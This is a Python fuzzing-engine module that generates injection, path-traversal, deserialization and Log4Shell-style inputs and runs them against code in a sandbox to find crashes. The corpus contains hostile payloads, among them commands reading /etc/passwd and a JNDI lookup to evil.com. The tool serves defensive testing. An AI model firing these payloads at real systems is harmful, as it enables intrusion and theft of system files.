from __future__ import annotations

import random
import string
import time
from typing import Any, Dict, List, Optional
from .dynamic_sandbox import DynamicSandbox


class FuzzingEngine:
    """
    Intelligent Fuzzing & Test Input Generation Engine.
    Employs grammar-based mutations, boundary exploration, and vulnerability-targeted
    fuzzing vectors (Hypothesis / Atheris pattern).
    """

    def __init__(self, sandbox: Optional[DynamicSandbox] = None):
        self.sandbox = sandbox or DynamicSandbox(timeout_seconds=2.5)

    def generate_fuzz_corpus(self, cwe_type: str, count: int = 50) -> List[str]:
        """
        Generates targeted fuzzing inputs based on the candidate vulnerability class.
        """
        corpus = []

        # Standard boundary strings
        corpus.extend([
            "",
            "A" * 100,
            "A" * 1000,
            "\x00",
            "%s%s%s%s%n",
            "1; DROP TABLE users;--",
            "' OR '1'='1' --",
            '" OR "1"="1" --',
            "' UNION SELECT NULL, username, password FROM users --",
            "admin'--",
            "127.0.0.1; whoami",
            "127.0.0.1 && cat /etc/passwd",
            "127.0.0.1 | dir",
            "$(cat /etc/passwd)",
            "`whoami`",
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/shadow",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f",
            "b'cos\\nsystem\\n(S\"whoami\"\\ntR.'",
            "<script>alert(1)</script>",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "-1",
            "99999999999999999999",
            "NaN",
            "null",
            "undefined",
            "True",
            "False",
            "None"
        ])

        # Generate mutated strings
        for _ in range(count):
            choice = random.randint(1, 4)
            if choice == 1:
                # Random ASCII noise
                s = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;':\",.<>/?", k=random.randint(5, 50)))
                corpus.append(s)
            elif choice == 2:
                # SQL injection mutation
                quote = random.choice(["'", '"', "`"])
                op = random.choice(["OR", "AND", "UNION SELECT"])
                num = random.randint(1, 999)
                corpus.append(f"{quote} {op} {quote}{num}{quote}={quote}{num}{quote} --")
            elif choice == 3:
                # Command injection mutation
                sep = random.choice([";", "&&", "||", "|", "&"])
                cmd = random.choice(["whoami", "id", "dir", "cat /etc/passwd", "uname -a", "echo VULN_TEST"])
                corpus.append(f"test_val {sep} {cmd}")
            else:
                # Path traversal mutation
                depth = random.randint(2, 8)
                trav = "../" * depth
                corpus.append(f"{trav}sensitive_config.json")

        return list(set(corpus))

    def run_fuzz_campaign(
        self,
        code_content: str,
        cwe_type: str,
        iterations: int = 30,
        target_fn_name: str = "main"
    ) -> Dict[str, Any]:
        """
        Executes a high-speed dynamic fuzzing campaign against the target Python snippet.
        """
        inputs = self.generate_fuzz_corpus(cwe_type, count=iterations)
        start_time = time.time()

        tested_count = 0
        crashes = []
        unique_errors = set()
        interesting_inputs = []

        max_tests = min(len(inputs), max(10, iterations))
        for fuzz_input in inputs[:max_tests]:
            tested_count += 1
            res = self.sandbox.execute_code(code_content, stdin_input=fuzz_input, cli_args=[fuzz_input])
            
            if res["crashed"] or res["exception_detected"]:
                err_sig = res["stack_trace"].splitlines()[-1] if res["stack_trace"] else f"Exit code {res['exit_code']}"
                if err_sig not in unique_errors:
                    unique_errors.add(err_sig)
                    crashes.append({
                        "input": fuzz_input,
                        "error_signature": err_sig,
                        "stderr": res["stderr"][:300],
                        "exit_code": res["exit_code"]
                    })
                    interesting_inputs.append(fuzz_input)
                
                # Early stop once sufficient crash diversity is captured
                if len(crashes) >= 3 and tested_count >= 15:
                    break

        duration = time.time() - start_time

        return {
            "inputs_tested": tested_count,
            "total_crashes": len(crashes),
            "unique_crash_types": len(unique_errors),
            "crash_details": crashes,
            "duration_seconds": round(duration, 3),
            "interesting_inputs": interesting_inputs,
            "fuzz_status": "VULNERABILITY_CRASHES_FOUND" if crashes else "CLEAN_NO_CRASHES"
        }
